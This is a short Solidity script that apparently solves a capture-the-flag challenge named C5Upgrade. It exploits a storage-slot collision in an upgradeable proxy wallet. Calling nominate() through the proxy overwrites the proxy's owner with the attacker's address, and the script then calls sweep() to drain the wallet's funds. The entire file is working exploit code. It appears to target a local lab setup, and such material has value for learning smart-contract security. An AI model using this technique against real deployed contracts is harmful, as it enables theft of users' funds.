// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C5Upgrade.sol";

/// Storage collision: call nominate() through the proxy (delegatecall) so the
/// logic's slot-1 write lands on the proxy's `owner`, then sweep.
contract SolveC5 is Script {
    address constant ME = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    function run() external {
        ProxySetup setup = ProxySetup(vm.envAddress("SETUP"));
        WalletProxy proxyWallet = setup.proxyWallet();
        vm.startBroadcast();
        WalletLogic(address(proxyWallet)).nominate(ME);   // overwrites proxy.owner
        proxyWallet.sweep(payable(ME));
        vm.stopBroadcast();
    }
}
